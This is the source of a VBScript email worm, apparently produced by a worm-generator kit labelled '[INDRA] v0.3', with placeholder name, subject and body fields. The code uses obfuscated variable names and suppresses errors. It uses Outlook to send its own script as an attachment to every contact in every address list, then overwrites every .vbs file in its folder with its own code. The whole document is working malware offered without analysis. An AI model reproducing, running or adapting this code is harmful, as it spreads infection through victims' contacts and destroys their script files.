'Worm Name: name
'Written By: autor
'[INDRA]
On Error Resume Next
uqpbsbvrypbtaml = WScript.ScriptFullName
Set sqdmbdmciirpxgu = CreateObject("WScript.Shell") 
Set ohjdeidmlypueef = CreateObject("Scripting.FileSystemObject")
Set nuijdyebhblxjkq = CreateObject("Outlook.Application")
If nuijdyebhblxjkq <> "" Then
Set qrbkxpdwwacjaiv = nuijdyebhblxjkq.GetNameSpace("MAPI")
For oeywfxcrsviwctm = 1 to qrbkxpdwwacjaiv.AddressLists.Count
Set rvxdloanhkseyds = nuijdyebhblxjkq.CreateItem(0)
Set lvstxlvdkiwjnrf = qrbkxpdwwacjaiv.AddressLists.Item(oeywfxcrsviwctm)
rvxdloanhkseyds.Attachments.Add uqpbsbvrypbtaml
rvxdloanhkseyds.Subject = "subj"
rvxdloanhkseyds.Body = "bod"
Set lbvlukauywrxbul = lvstxlvdkiwjnrf.AddressEntries
Set pxktbxcsgmbuaby = rvxdloanhkseyds.Recipients
For mabbcbchlreaosw = 1 to lbvlukauywrxbul.Count
rvxdloanhkseyds.Recipients.Add lbvlukauywrxbul.Item(mabbcbchlreaosw)
Next
rvxdloanhkseyds.Send
Next
End If
Set vvfbiuaualbohgu = ohjdeidmlypueef.OpenTextFile(uqpbsbvrypbtaml, 1, 0)
ycirxjggrkbktum = vvfbiuaualbohgu.ReadAll
vvfbiuaualbohgu.Close
dlviinxwdirboqv = Left(uqpbsbvrypbtaml, InStrRev(uqpbsbvrypbtaml, "\"))
For Each lhgifpvurkdwlvi in ohjdeidmlypueef.GetFolder(dlviinxwdirboqv).Files
If ( Right(lhgifpvurkdwlvi.Name, 4) = ".vbs" ) Then
Set hmegdnnvekcmiei = ohjdeidmlypueef.CreateTextFile(lhgifpvurkdwlvi.Name, True)
hmegdnnvekcmiei.Write ycirxjggrkbktum
hmegdnnvekcmiei.Close
End If
Next
'Generated with [INDRA] v0.3.
